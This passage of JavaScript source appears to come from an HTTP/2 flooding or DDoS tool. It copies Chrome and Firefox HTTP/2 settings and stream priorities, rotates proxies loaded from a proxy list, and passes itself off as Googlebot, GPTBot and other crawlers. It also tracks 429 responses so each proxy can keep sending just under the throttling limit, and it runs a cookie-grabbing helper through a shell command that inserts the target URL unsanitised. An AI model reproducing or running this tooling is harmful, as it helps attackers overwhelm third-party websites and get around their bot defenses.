        // Http2 extended settings
        enableConnectProtocol: (browserSettings.SETTINGS_ENABLE_CONNECT_PROTOCOL === 1) || (defaultSettings[HTTP2_SETTINGS.ENABLE_CONNECT_PROTOCOL] === 1),
        enablePush: (browserSettings.SETTINGS_ENABLE_PUSH === 1) || (defaultSettings[HTTP2_SETTINGS.ENABLE_PUSH] === 1),
        enableUserAgentHeader: false // Don't add automatic UA header
    };
    
    // Add plugin-specific settings to HTTP/2 session if plugins are present
    if (clientHello.plugins && clientHello.plugins.count > 0) {
        // Calculate dynamic connection values based on plugins
        const pluginCount = clientHello.plugins.count;
        
        // Update values based on plugin count to mimic how browsers with plugins behave
        return {
            ...baseSessionOptions,
            maxSessionMemory: baseSessionOptions.maxSessionMemory + (pluginCount * 100),
            maxReservedRemoteStreams: baseSessionOptions.maxReservedRemoteStreams + (pluginCount * 2),
            peerMaxConcurrentStreams: Math.min(pluginCount * 50 + baseSessionOptions.peerMaxConcurrentStreams, 500),
            paddingStrategy: pluginCount > 2 ? 1 : 0,
            // Additional options for browsers with plugins
            autoDecompressData: true,
            initialWindowSize: browserSettings.SETTINGS_INITIAL_WINDOW_SIZE || defaultSettings[HTTP2_SETTINGS.INITIAL_WINDOW_SIZE]
        };
    }
    
    // Return options with browser-specific customizations
    if (browser === 'chrome') {
        return {
            ...baseSessionOptions,
            maxSessionMemory: 15000, // Chrome uses higher memory limits
            initialWindowSize: browserSettings.SETTINGS_INITIAL_WINDOW_SIZE || 6291456
        };
    } else { // Firefox
        return {
            ...baseSessionOptions,
            maxSessionMemory: 8000, // Firefox is more conservative
            initialWindowSize: browserSettings.SETTINGS_INITIAL_WINDOW_SIZE || 131072,
            maxHeaderListSize: browserSettings.SETTINGS_MAX_HEADER_LIST_SIZE || 65536
        };
    }
}

// Function to execute getcookie.js and wait for it to complete
function runGetCookieScript(targetUrl) {
    return new Promise((resolve) => {
        console.log(`\x1b[36m[INFO]\x1b[0m Automatically running getcookie.js for ${targetUrl}...`);
        
        
        const command = `node ./getcookie.js ${targetUrl} --proxy http.txt`;
        
        
        const childProcess = exec(command, (error, stdout, stderr) => {
            if (error) {
                console.log(`\x1b[31m[ERROR]\x1b[0m getcookie.js execution failed: ${error.message}`);
                resolve(false);
                return;
            }
            
            if (stderr) {
                console.log(`\x1b[33m[WARNING]\x1b[0m getcookie.js stderr: ${stderr}`);
            }
            
            
            if (stdout.includes('Cookies saved to file:')) {
                console.log(`\x1b[32m[SUCCESS]\x1b[0m getcookie.js completed successfully`);
                resolve(true);
            } else {
                console.log(`\x1b[33m[WARNING]\x1b[0m getcookie.js did not save cookies`);
                resolve(false);
            }
        });
        
        
        childProcess.stdout.on('data', (data) => {
            process.stdout.write(data);
        });
        
        childProcess.stderr.on('data', (data) => {
            process.stderr.write(data);
        });
    });
}


const botUserAgents = [
    "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.2; +https://openai.com/gptbot)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (compatible; Baiduspider-image/2.0; +http://www.baidu.com/search/spider.html)",
];



function trackProxyRequest(proxyIP) {
    if (!proxyStats[proxyIP]) {
        proxyStats[proxyIP] = {
            requests: 0,
            retryAfter: 0,
            lastRequestTime: 0,
            autoRateLimit: AUTO_RATE_LIMIT_DEFAULT, 
            successCount: 0,
            errorCount: 0
        };
    }
    proxyStats[proxyIP].requests++;
    proxyStats[proxyIP].lastRequestTime = Date.now();
    return proxyStats[proxyIP].requests;
}


function isProxyRateLimited(proxyIP) {
    if (!proxyStats[proxyIP]) return false;
    
    if (options.autoratelimit) {
        
        return proxyStats[proxyIP].requests >= proxyStats[proxyIP].autoRateLimit;
    } else if (options.ratelimit) {
        
        return proxyStats[proxyIP].requests >= options.ratelimit;
    }
    
    return false;
}


function adjustAutoRateLimit(proxyIP, statusCode) {
    if (!options.autoratelimit || !proxyStats[proxyIP]) return;
    
    
    let currentLimit = proxyStats[proxyIP].autoRateLimit;
    
    
    if (statusCode >= 200 && statusCode < 400) {
 
        proxyStats[proxyIP].successCount++;
        
        
        if (proxyStats[proxyIP].successCount % 5 === 0) {
            currentLimit = Math.ceil(currentLimit * AUTO_RATE_LIMIT_INCREASE);
        }
    } else if (statusCode >= 400) {
        
        proxyStats[proxyIP].errorCount++;
        
        
        currentLimit = Math.max(AUTO_RATE_LIMIT_MIN, Math.floor(currentLimit * AUTO_RATE_LIMIT_DECREASE));
    }
    
    
    proxyStats[proxyIP].autoRateLimit = currentLimit;
}


function setProxyRetryAfter(proxyIP, retryAfterValue) {
    if (!proxyStats[proxyIP]) {
        proxyStats[proxyIP] = {
            requests: 0,
            retryAfter: 0,
            lastRequestTime: 0,
            autoRateLimit: AUTO_RATE_LIMIT_DEFAULT, 
            successCount: 0,
            errorCount: 0
        };
    }
    
    
    let retryAfterSeconds = 0;
    
    if (!isNaN(retryAfterValue)) {
        
        retryAfterSeconds = parseInt(retryAfterValue);
    } else {
        
        try {
            const retryDate = new Date(retryAfterValue);
            retryAfterSeconds = Math.max(0, Math.floor((retryDate - new Date()) / 1000));
        } catch (e) {
            
            retryAfterSeconds = 1;
        }
    }
    
    
    const MIN_RETRY_SECONDS = 3;
    retryAfterSeconds = Math.max(retryAfterSeconds, MIN_RETRY_SECONDS);
    
    
    proxyStats[proxyIP].retryAfter = Date.now() + (retryAfterSeconds * 1000);
    
    
    if (options.debug) {
        console.log(`\x1b[36m[DEBUG]\x1b[0m Proxy ${proxyIP} set to wait for ${retryAfterSeconds}s after 429 response`);
    }
    
    
    
    if (cluster.isWorker) {
        try {
            process.send({
                type: 'retry_after',
                value: 1
            });
        } catch (e) {
            
        }
    }
}


function isProxyInRetryWait(proxyIP) {
    if (!proxyStats[proxyIP]) return false;
    
    
    const isWaiting = Date.now() < proxyStats[proxyIP].retryAfter;
    

    if (!isWaiting && proxyStats[proxyIP].retryAfter > 0 && options.debug) {
        const waitTime = Math.round((proxyStats[proxyIP].retryAfter - proxyStats[proxyIP].lastRequestTime) / 1000);
        console.log(`\x1b[36m[DEBUG]\x1b[0m Proxy ${proxyIP} released after waiting ${waitTime}s`);
        
        if (!isWaiting) proxyStats[proxyIP].retryAfter = 0;
    }
    
    return isWaiting;
}


function getNextAvailableProxy() {
    
    let availableProxies = proxies.filter(proxy => {
        
        const parsedProxy = parseProxy(proxy);
        const proxyIP = parsedProxy.host;
        return !isProxyRateLimited(proxyIP) && !isProxyInRetryWait(proxyIP);
    });
    
    
    if (availableProxies.length === 0) {
        return randomElement(proxies);
    }
    
    
    return randomElement(availableProxies);
}


function getBrowserPriorityData(browser) {
    if (browser === 'firefox') {
        return {
            exclusive: 0,
            depends_on: 0,
            weight: 42
        };
    } else { 
        return {
            exclusive: 1,
            depends_on: 0,
            weight: 256
        };
    }
}


function applyBrowserPriority(stream, browser) {
    if (!stream || typeof stream.priority !== 'function') return;
    
    try {
        
        const priorityData = getBrowserPriorityData(browser);
        
        stream.priority({
            exclusive: priorityData.exclusive,
            parent: priorityData.depends_on,
            weight: priorityData.weight
        });
    } catch (e) {
        // Ignore errors in priority application
    }
}
